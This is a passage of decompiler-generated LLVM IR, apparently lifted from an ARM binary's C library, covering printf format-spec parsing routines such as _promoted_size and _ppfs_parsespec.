  %v1_13d20 = inttoptr i32 %v3_13cac to i32*
  %v2_13d20 = load i32, i32* %v1_13d20, align 4
  store i32 %v2_13d20, i32* %r2.global-to-local, align 4
  %v1_13d24 = add i32 %v3_13cac, 4
  store i32 %v1_13d24, i32* %r3.global-to-local, align 4
  store i32 %v1_13d24, i32* %v2_13cac, align 4
  %v0_13d2c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d2c = load i32, i32* %ip.global-to-local, align 4
  %v2_13d2c = inttoptr i32 %v1_13d2c to i32*
  store i32 %v0_13d2c, i32* %v2_13d2c, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d34:                               ; preds = %dec_label_pc_13ccc, %dec_label_pc_13d04
  %v3_13d34 = load i32, i32* %v2_13cac, align 4
  store i32 %v3_13d34, i32* %r3.global-to-local, align 4
  %v1_13d38 = inttoptr i32 %v3_13d34 to i32*
  %v2_13d38 = load i32, i32* %v1_13d38, align 4
  store i32 %v2_13d38, i32* %r1.global-to-local, align 4
  %v3_13d38 = add i32 %v3_13d34, 4
  %v4_13d38 = inttoptr i32 %v3_13d38 to i32*
  %v5_13d38 = load i32, i32* %v4_13d38, align 4
  store i32 %v5_13d38, i32* %r2.global-to-local, align 4
  %v1_13d3c = add i32 %v3_13d34, 8
  store i32 %v1_13d3c, i32* %r3.global-to-local, align 4
  store i32 %v1_13d3c, i32* %v2_13cac, align 4
  %v0_13d44 = load i32, i32* %ip.global-to-local, align 4
  %v1_13d44 = inttoptr i32 %v0_13d44 to i32*
  %v2_13d44 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13d44, i32* %v1_13d44, align 4
  %v3_13d44 = add i32 %v0_13d44, 4
  %v4_13d44 = inttoptr i32 %v3_13d44 to i32*
  %v5_13d44 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_13d44, i32* %v4_13d44, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d4c:                               ; preds = %dec_label_pc_13ce0, %dec_label_pc_13ccc, %dec_label_pc_13cc0, %dec_label_pc_13d04
  %v1_13d4c = add i32 %v3_13cac, 4
  store i32 %v1_13d4c, i32* %r3.global-to-local, align 4
  store i32 %v1_13d4c, i32* %v2_13cac, align 4
  %v0_13d54 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d54 = inttoptr i32 %v0_13d54 to i32*
  %v2_13d54 = load i32, i32* %v1_13d54, align 4
  store i32 %v2_13d54, i32* %r3.global-to-local, align 4
  %v1_13d58 = load i32, i32* %ip.global-to-local, align 4
  %v2_13d58 = inttoptr i32 %v1_13d58 to i32*
  store i32 %v2_13d54, i32* %v2_13d58, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d34, %dec_label_pc_13d20, %dec_label_pc_13d0c, %dec_label_pc_13d4c
  %v0_13d5c = load i32, i32* %ip.global-to-local, align 4
  %v1_13d5c = add i32 %v0_13d5c, 8
  store i32 %v1_13d5c, i32* %ip.global-to-local, align 4
  %v0_13d60.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13d64.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %dec_label_pc_13c9c, %dec_label_pc_13d5c
  %v0_13d64 = phi i32 [ %v0_13d6425, %dec_label_pc_13c9c ], [ %v0_13d64.pre, %dec_label_pc_13d5c ]
  %v0_13d60 = phi i32 [ %v1_13c9c24, %dec_label_pc_13c9c ], [ %v0_13d60.pre, %dec_label_pc_13d5c ]
  %v1_13d60 = add i32 %v0_13d60, 1
  store i32 %v1_13d60, i32* %lr.global-to-local, align 4
  %v1_13d64 = add i32 %v0_13d64, 28
  %v2_13d64 = inttoptr i32 %v1_13d64 to i32*
  %v3_13d64 = load i32, i32* %v2_13d64, align 4
  store i32 %v3_13d64, i32* %r3.global-to-local, align 4
  %v5_13d6c = icmp slt i32 %v1_13d60, %v3_13d64
  br i1 %v5_13d6c, label %dec_label_pc_13c9c, label %dec_label_pc_13d64.dec_label_pc_13d70.loopexit_crit_edge

dec_label_pc_13d74:                               ; preds = %entry
  br i1 %v6_13c50, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13d74
  %v2_13d78 = add i32 %v0_13c38, 36
  %v3_13d78 = inttoptr i32 %v2_13d78 to i8*
  %v4_13d78 = load i8, i8* %v3_13d78, align 1
  %v5_13d78 = zext i8 %v4_13d78 to i32
  %v5_13d7c = mul nuw nsw i32 %v5_13d78, 8
  %v6_13d7c = add i32 %v5_13d7c, %v1_13c44
  store i32 %v6_13d7c, i32* %r3.global-to-local, align 4
  %v2_13d80 = add i32 %v6_13d7c, -8
  %v3_13d80 = inttoptr i32 %v2_13d80 to i32*
  %v4_13d80 = load i32, i32* %v3_13d80, align 4
  store i32 %v4_13d80, i32* %r3.global-to-local, align 4
  store i32 %v4_13d80, i32* %v2_13c48, align 4
  %v0_13d88.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13d74, %bb
  %v2_13d9c = phi i32 [ %v0_13d88.pre, %bb ], [ %v0_13c38, %dec_label_pc_13d74 ]
  %v1_13d88 = add i32 %v2_13d9c, 4
  %v2_13d88 = inttoptr i32 %v1_13d88 to i32*
  %v3_13d88 = load i32, i32* %v2_13d88, align 4
  store i32 %v3_13d88, i32* %r3.global-to-local, align 4
  %v6_13d8c = icmp eq i32 %v3_13d88, -2147483648
  br i1 %v6_13d8c, label %bb15, label %dec_label_pc_13d70

bb15:                                             ; preds = %.thread2
  %v2_13d90 = add i32 %v2_13d9c, 37
  %v3_13d90 = inttoptr i32 %v2_13d90 to i8*
  %v4_13d90 = load i8, i8* %v3_13d90, align 1
  %v5_13d90 = zext i8 %v4_13d90 to i32
  %v1_13d94 = load i32, i32* %ip.global-to-local, align 4
  %v5_13d94 = mul nuw nsw i32 %v5_13d90, 8
  %v6_13d94 = add i32 %v5_13d94, %v1_13d94
  store i32 %v6_13d94, i32* %r3.global-to-local, align 4
  %v2_13d98 = add i32 %v6_13d94, -8
  %v3_13d98 = inttoptr i32 %v2_13d98 to i32*
  %v4_13d98 = load i32, i32* %v3_13d98, align 4
  store i32 %v4_13d98, i32* %r3.global-to-local, align 4
  store i32 %v4_13d98, i32* %v2_13d88, align 4
  %v0_13da0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13d70

dec_label_pc_13d64.dec_label_pc_13d70.loopexit_crit_edge: ; preds = %dec_label_pc_13d60
  br label %dec_label_pc_13d70.loopexit

dec_label_pc_13d70.loopexit:                      ; preds = %dec_label_pc_13d64.dec_label_pc_13d70.loopexit_crit_edge, %dec_label_pc_13c94
  %v0_13d64.lcssa = phi i32 [ %v0_13d64, %dec_label_pc_13d64.dec_label_pc_13d70.loopexit_crit_edge ], [ %v0_13d6418, %dec_label_pc_13c94 ]
  br label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d70.loopexit, %.thread2, %bb15
  %v1_13dc0 = phi i32 [ %v0_13d64.lcssa, %dec_label_pc_13d70.loopexit ], [ %v2_13d9c, %.thread2 ], [ %v0_13da0.pre, %bb15 ]
  %v1_13da0 = add i32 %v1_13dc0, 8
  %v2_13da0 = inttoptr i32 %v1_13da0 to i32*
  %v3_13da0 = load i32, i32* %v2_13da0, align 4
  store i32 %v3_13da0, i32* %r1.global-to-local, align 4
  %v1_13da4 = icmp slt i32 %v3_13da0, 0
  br i1 %v1_13da4, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_13d70
  %v5_13da8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_13da8, i32* @r4, align 4
  ret i32 %v1_13dc0

bb17:                                             ; preds = %dec_label_pc_13d70
  %v1_13dac = add i32 %v1_13dc0, 16
  %v2_13dac = inttoptr i32 %v1_13dac to i32*
  %v3_13dac = load i32, i32* %v2_13dac, align 4
  %v1_13db4 = sub i32 0, %v3_13da0
  store i32 %v1_13db4, i32* %r1.global-to-local, align 4
  %v1_13db0 = and i32 %v3_13dac, -10
  %v1_13db8 = or i32 %v1_13db0, 8
  store i32 %v1_13db8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_13dc0 = add i32 %v1_13dc0, 20
  %v3_13dc0 = inttoptr i32 %v2_13dc0 to i32*
  store i32 32, i32* %v3_13dc0, align 4
  %v0_13dc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13dc4 = load i32, i32* @r0, align 4
  %v2_13dc4 = add i32 %v1_13dc4, 8
  %v3_13dc4 = inttoptr i32 %v2_13dc4 to i32*
  store i32 %v0_13dc4, i32* %v3_13dc4, align 4
  %v0_13dc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13dc8 = load i32, i32* @r0, align 4
  %v2_13dc8 = add i32 %v1_13dc8, 16
  %v3_13dc8 = inttoptr i32 %v2_13dc8 to i32*
  store i32 %v0_13dc8, i32* %v3_13dc8, align 4
  %v2_13dcc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13dcc, i32* @r4, align 4
  %v8_13dcc = load i32, i32* @r0, align 4
  ret i32 %v8_13dcc

; uselistorder directives
  uselistorder i32 %v1_13d60, { 2, 1, 0 }
  uselistorder i32 %v0_13d64, { 1, 2, 0 }
  uselistorder i32 %v3_13d34, { 0, 2, 1, 3 }
  uselistorder i32 %v3_13cac, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_13cac, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_13ca0, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_13c9c24, { 1, 0 }
  uselistorder i32 %v0_13d6418, { 2, 0, 1 }
  uselistorder i32 %v0_13c38, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_13d70, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13d60, { 1, 0 }
  uselistorder label %dec_label_pc_13d5c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13d4c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13d34, { 1, 0 }
  uselistorder label %dec_label_pc_13d20, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_13c9c, { 1, 0 }
  uselistorder label %dec_label_pc_13c94, { 1, 0 }
  uselistorder label %dec_label_pc_13c70, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_13dec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13dd8

dec_label_pc_13dd8:                               ; preds = %dec_label_pc_13df4, %entry
  %v0_13dd8 = phi i32 [ %v1_13dd8, %dec_label_pc_13df4 ], [ ptrtoint (i32* @global_var_1ccf4.876 to i32), %entry ]
  %v1_13dd8 = add i32 %v0_13dd8, -2
  %v1_13ddc = add i32 %v0_13dd8, -1
  %v2_13ddc = inttoptr i32 %v1_13ddc to i8*
  %v3_13ddc = load i8, i8* %v2_13ddc, align 1
  %v4_13ddc = zext i8 %v3_13ddc to i32
  %v1_13de0 = inttoptr i32 %v1_13dd8 to i8*
  %v2_13de0 = load i8, i8* %v1_13de0, align 2
  %v3_13de0 = zext i8 %v2_13de0 to i32
  %v3_13de4 = mul nuw i32 %v4_13ddc, 16777216
  %v4_13de8 = sdiv i32 %v3_13de4, 65536
  %v5_13de8 = or i32 %v4_13de8, %v3_13de0
  %v9_13dec = icmp eq i32 %v5_13de8, %v1_13dec.pre
  br i1 %v9_13dec, label %dec_label_pc_13dd8.dec_label_pc_13e00_crit_edge, label %dec_label_pc_13df4

dec_label_pc_13dd8.dec_label_pc_13e00_crit_edge:  ; preds = %dec_label_pc_13dd8
  br label %dec_label_pc_13e00

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13dd8
  %tmp = icmp ugt i32 %v1_13dd8, ptrtoint (i32* @global_var_1ccdc.878 to i32)
  br i1 %tmp, label %dec_label_pc_13dd8, label %dec_label_pc_13e00

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13df4, %dec_label_pc_13dd8.dec_label_pc_13e00_crit_edge
  %v2_13e08.pre-phi = sub i32 %v1_13dd8, ptrtoint (i32* @global_var_1ccdc.878 to i32)
  store i32 ptrtoint (i32* @global_var_1ccf4.876 to i32), i32* @r2, align 4
  %v4_13e0c = sdiv i32 %v2_13e08.pre-phi, 2
  %v5_13e0c = add i32 %v4_13e0c, ptrtoint (i32* @global_var_1ccf4.876 to i32)
  %v6_13e0c = inttoptr i32 %v5_13e0c to i8*
  %v7_13e0c = load i8, i8* %v6_13e0c, align 1
  %v9_13e0c = zext i8 %v7_13e0c to i32
  ret i32 %v9_13e0c

; uselistorder directives
  uselistorder i32 %v1_13dd8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13dd8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ccf4.876 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13e20 = load i32, i32* @r4, align 4
  store i32 %v3_13e20, i32* %stack_var_-32, align 4
  %v6_13e20 = load i32, i32* @r5, align 4
  %v25_13e20 = ptrtoint i32* %stack_var_-32 to i32
  %v1_13e24 = add i32 %tmp, 16
  %v2_13e24 = inttoptr i32 %v1_13e24 to i32*
  %v3_13e24 = load i32, i32* %v2_13e24, align 4
  %v2_13e28 = ptrtoint i32* %stack_var_-88 to i32
  %v1_13e2c = and i32 %v3_13e24, 128
  store i32 %v1_13e2c, i32* @r4, align 4
  %v2_13e2c = icmp eq i32 %v1_13e2c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_13e4c = add i32 %tmp, 24
  %v2_13e4c = inttoptr i32 %v1_13e4c to i32*
  %v3_13e4c = load i32, i32* %v2_13e4c, align 4
  store i32 %v3_13e4c, i32* %sb.global-to-local, align 4
  br i1 %v2_13e2c, label %bb, label %dec_label_pc_13e6c

bb:                                               ; preds = %entry
  %v3_13e50 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_1403c
  %v0_13e5c = load i32, i32* %r0.global-to-local, align 4
  %v0_1406c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14064

dec_label_pc_13e64:                               ; preds = %dec_label_pc_14068
  %v1_13e64 = add i32 %v0_1406c.pre, 1
  store i32 %v1_13e64, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14084

dec_label_pc_13e6c:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13ea4.dec_label_pc_13e70_crit_edge, %dec_label_pc_13e6c
  %v1_13e80 = phi i32 [ %v1_13e94, %dec_label_pc_13ea4.dec_label_pc_13e70_crit_edge ], [ 0, %dec_label_pc_13e6c ]
  %v0_13e70 = phi i32 [ %v0_13e70.pre, %dec_label_pc_13ea4.dec_label_pc_13e70_crit_edge ], [ %tmp, %dec_label_pc_13e6c ]
  %v1_13e70 = inttoptr i32 %v0_13e70 to i32*
  %v2_13e70 = load i32, i32* %v1_13e70, align 4
  %v4_13e74 = mul i32 %v1_13e80, 4
  %v5_13e74 = add i32 %v2_13e70, %v4_13e74
  store i32 %v5_13e74, i32* %r3.global-to-local, align 4
  %v1_13e78 = add i32 %v5_13e74, -4
  %v2_13e78 = inttoptr i32 %v1_13e78 to i32*
  %v3_13e78 = load i32, i32* %v2_13e78, align 4
  store i32 %v3_13e78, i32* %r1.global-to-local, align 4
  store i32 %v25_13e20, i32* %ip.global-to-local, align 4
  %v2_13e80 = add i32 %v1_13e80, %v25_13e20
  store i32 %v2_13e80, i32* %r2.global-to-local, align 4
  %v1_13e84 = trunc i32 %v3_13e78 to i8
  %v3_13e84 = add i32 %v2_13e80, -56
  %v4_13e84 = inttoptr i32 %v3_13e84 to i8*
  store i8 %v1_13e84, i8* %v4_13e84, align 1
  %v0_13e88 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e88 = add i32 %v0_13e88, -56
  %v2_13e88 = inttoptr i32 %v1_13e88 to i8*
  %v3_13e88 = load i8, i8* %v2_13e88, align 1
  %v4_13e88 = zext i8 %v3_13e88 to i32
  store i32 %v4_13e88, i32* %r2.global-to-local, align 4
  %v0_13e8c = load i32, i32* %r3.global-to-local, align 4
  %v1_13e8c = add i32 %v0_13e8c, -4
  %v2_13e8c = inttoptr i32 %v1_13e8c to i32*
  %v3_13e8c = load i32, i32* %v2_13e8c, align 4
  store i32 %v3_13e8c, i32* %r3.global-to-local, align 4
  %v9_13e90 = icmp eq i32 %v4_13e88, %v3_13e8c
  %v0_13e94 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e94 = add i32 %v0_13e94, 1
  store i32 %v1_13e94, i32* %r0.global-to-local, align 4
  br i1 %v9_13e90, label %dec_label_pc_13e9c, label %dec_label_pc_142b4

dec_label_pc_13e9c:                               ; preds = %dec_label_pc_13e70
  %v2_13e9c = icmp eq i8 %v3_13e88, 0
  br i1 %v2_13e9c, label %dec_label_pc_13eac, label %dec_label_pc_13ea4

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13e9c
  %tmp166 = icmp ult i32 %v1_13e94, 32
  br i1 %tmp166, label %dec_label_pc_13ea4.dec_label_pc_13e70_crit_edge, label %dec_label_pc_13eac

dec_label_pc_13ea4.dec_label_pc_13e70_crit_edge:  ; preds = %dec_label_pc_13ea4
  %v0_13e70.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13e70

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13ea4, %dec_label_pc_13e9c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13eb4 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_13eb8

dec_label_pc_13eb8:                               ; preds = %bb, %dec_label_pc_13eac
  %storemerge102 = phi i32 [ %v2_13eb4, %dec_label_pc_13eac ], [ %v3_13e50, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_13ec8

dec_label_pc_13ec4:                               ; preds = %.thread22, %dec_label_pc_13fd4
  %v0_13ec4 = phi i32 [ %v2_1404c, %.thread22 ], [ %storemerge105, %dec_label_pc_13fd4 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_13fd4 ]
  store i32 %v0_13ec4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13ec8

dec_label_pc_13ec8:                               ; preds = %dec_label_pc_13eb8, %dec_label_pc_13ec4
  %v1_13ee4 = phi i32 [ %storemerge102, %dec_label_pc_13eb8 ], [ %v0_13ec4, %dec_label_pc_13ec4 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_13eb8 ], [ %stack_var_-48.0, %dec_label_pc_13ec4 ]
  %v1_13ec8 = inttoptr i32 %v1_13ee4 to i8*
  %v2_13ec8 = load i8, i8* %v1_13ec8, align 1
  %v3_13ec8 = zext i8 %v2_13ec8 to i32
  store i32 %v3_13ec8, i32* %r3.global-to-local, align 4
  %v7_13ecc = icmp eq i8 %v2_13ec8, 42
  br i1 %v7_13ecc, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_13ec8
  store i32 %v1_13ee4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_13ec8
  %v1_13ed8 = load i32, i32* @lr, align 4
  %v4_13ed8 = mul i32 %v1_13ed8, -4
  %v5_13ed8 = add i32 %v4_13ed8, %v25_13e20
  store i32 %v5_13ed8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13ee4 = add i32 %v1_13ee4, 1
  store i32 %v2_13ee4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_13eec = add i32 %v5_13ed8, -12
  %v4_13eec = inttoptr i32 %v3_13eec to i32*
  store i32 0, i32* %v4_13eec, align 4
  %v0_13f10.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_13f10.pre = phi i32 [ %v0_13f10.pre.pre, %bb124 ], [ %v1_13ee4, %.thread9.thread ]
  %v2_13f14.pre = load i32, i32* @global_var_26250, align 4
  br label %.backedge

dec_label_pc_13ef4:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_13ef8 = load i32, i32* %r0.global-to-local, align 4
  %v7_13efc = icmp sgt i32 %v0_13ef8, 4094
  br i1 %v7_13efc, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_13ef4
  %v1_13f0414 = add i32 %v0_13f88, 1
  store i32 %v1_13f0414, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_13ef4
  %v11_13f00 = mul i32 %v0_13ef8, 10
  %v12_13f00 = add i32 %v11_13f00, %v3_13f10
  store i32 %v12_13f00, i32* %r3.global-to-local, align 4
  %v1_13f04 = add i32 %v0_13f88, 1
  store i32 %v1_13f04, i32* %r6.global-to-local, align 4
  %v9_13f08 = add i32 %v12_13f00, -48
  store i32 %v9_13f08, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_13f88 = phi i32 [ %v0_13f10.pre, %.preheader ], [ %v1_13f04, %bb126 ], [ %v1_13f0414, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_26250 to i32), i32* %r3.global-to-local, align 4
  %v1_13f10 = inttoptr i32 %v0_13f88 to i8*
  %v2_13f10 = load i8, i8* %v1_13f10, align 1
  %v3_13f10 = zext i8 %v2_13f10 to i32
  store i32 %v3_13f10, i32* %r2.global-to-local, align 4
  store i32 %v2_13f14.pre, i32* %r3.global-to-local, align 4
  %v3_13f18 = mul nuw nsw i32 %v3_13f10, 2
  %v4_13f18 = add i32 %v3_13f18, %v2_13f14.pre
  %v5_13f18 = inttoptr i32 %v4_13f18 to i8*
  %v6_13f18 = load i8, i8* %v5_13f18, align 1
  %v8_13f18 = zext i8 %v6_13f18 to i32
  store i32 %v8_13f18, i32* %r3.global-to-local, align 4
  %v1_13f1c = and i32 %v8_13f18, 8
  %v2_13f1c = icmp eq i32 %v1_13f1c, 0
  br i1 %v2_13f1c, label %dec_label_pc_13f24, label %dec_label_pc_13ef4

dec_label_pc_13f24:                               ; preds = %.backedge
  %v0_13f24 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f24 = add i32 %v0_13f24, -1
  %v2_13f24 = inttoptr i32 %v1_13f24 to i8*
  %v3_13f24 = load i8, i8* %v2_13f24, align 1
  %v4_13f24 = zext i8 %v3_13f24 to i32
  store i32 %v4_13f24, i32* %r3.global-to-local, align 4
  %v7_13f28 = icmp eq i8 %v3_13f24, 37
  br i1 %v7_13f28, label %dec_label_pc_13f30, label %dec_label_pc_13fec

dec_label_pc_13f30:                               ; preds = %dec_label_pc_13f24
  %v7_13f30 = icmp eq i8 %v2_13f10, 36
  %. = zext i1 %v7_13f30 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_13f3c = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_13f3c, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_13f30
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_13f30, %bb130
  %v1_13f98 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_13f30 ]
  %v2_13f44 = icmp eq i32 %v1_13f98, 0
  %v0_13f74 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_13f44, label %dec_label_pc_13f74, label %dec_label_pc_13f4c

dec_label_pc_13f4c:                               ; preds = %thread-pre-split
  %v2_13f74 = icmp eq i32 %v0_13f74, 0
  %v1_13f50 = add i32 %v0_13f88, 1
  store i32 %v1_13f50, i32* %r1.global-to-local, align 4
  br i1 %v2_13f74, label %dec_label_pc_142b4, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f4c
  %v2_13f58 = sub i32 %v0_13f3c, %v0_13f74
  %v4_13f58 = xor i32 %v0_13f74, %v0_13f3c
  %v5_13f58 = xor i32 %v2_13f58, %v0_13f3c
  %v6_13f58 = and i32 %v5_13f58, %v4_13f58
  %v7_13f58 = icmp slt i32 %v6_13f58, 0
  %v8_13f58 = icmp slt i32 %v2_13f58, 0
  %v9_13f58 = icmp eq i32 %v0_13f3c, %v0_13f74
  %v3_13f5c = xor i1 %v8_13f58, %v7_13f58
  %v4_13f5c = or i1 %v9_13f58, %v3_13f5c
  br i1 %v4_13f5c, label %dec_label_pc_13f6c, label %bb131

bb131:                                            ; preds = %dec_label_pc_13f58
  store i32 %v0_13f3c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13f88, %dec_label_pc_13f90
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13f6c

dec_label_pc_13f6c:                               ; preds = %bb131, %dec_label_pc_13f58, %dec_label_pc_13f68
  %v0_13f6c = phi i32 [ %v0_13f24, %dec_label_pc_13f68 ], [ %v1_13f50, %dec_label_pc_13f58 ], [ %v1_13f50, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_13f68 ], [ %v0_13f3c, %dec_label_pc_13f58 ], [ %v0_13f3c, %bb131 ]
  br label %dec_label_pc_13fa4

dec_label_pc_13f74:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_13f74, 1
  br i1 %tmp132, label %dec_label_pc_13f88, label %dec_label_pc_13f7c

dec_label_pc_13f7c:                               ; preds = %dec_label_pc_13f74
  %v7_13f7c = icmp eq i8 %v2_13f10, 109
  br i1 %v7_13f7c, label %dec_label_pc_13fec, label %dec_label_pc_142b4

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13f74
  %tmp167 = icmp ugt i32 %v0_13f88, %v0_13f24
  br i1 %tmp167, label %dec_label_pc_13f90, label %dec_label_pc_13f68

dec_label_pc_13f90:                               ; preds = %dec_label_pc_13f88
  %v1_13f90 = inttoptr i32 %v0_13f24 to i8*
  %v2_13f90 = load i8, i8* %v1_13f90, align 1
  %v3_13f90 = zext i8 %v2_13f90 to i32
  store i32 %v3_13f90, i32* %r3.global-to-local, align 4
  %v7_13f94 = icmp eq i8 %v2_13f90, 48
  br i1 %v7_13f94, label %dec_label_pc_13f68, label %bb133

bb133:                                            ; preds = %dec_label_pc_13f90
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fa4.loopexit:                      ; preds = %dec_label_pc_13fac
  %v1_13fb8 = load i32, i32* @r4, align 4
  %v3_13fb8 = or i32 %v1_13fb8, %v0_13fcc
  store i32 %v3_13fb8, i32* @r4, align 4
  %v2_13fbc = add i32 %storemerge105, 1
  br label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13fa4.loopexit, %dec_label_pc_13f6c
  %storemerge105 = phi i32 [ %v0_13f6c, %dec_label_pc_13f6c ], [ %v2_13fbc, %dec_label_pc_13fa4.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1ccd4.883 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_13fb0 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_13fac

dec_label_pc_13fac:                               ; preds = %dec_label_pc_13fc4, %dec_label_pc_13fa4
  %v0_13fcc = phi i32 [ %v2_13fcc, %dec_label_pc_13fc4 ], [ 1, %dec_label_pc_13fa4 ]
  %v0_13fac = phi i32 [ %v5_13fac, %dec_label_pc_13fc4 ], [ ptrtoint ([8 x i8]* @global_var_1ccd4.883 to i32), %dec_label_pc_13fa4 ]
  %v1_13fac = inttoptr i32 %v0_13fac to i8*
  %v2_13fac = load i8, i8* %v1_13fac, align 1
  %v3_13fac = zext i8 %v2_13fac to i32
  store i32 %v3_13fac, i32* %r2.global-to-local, align 4
  %v5_13fac = add i32 %v0_13fac, 1
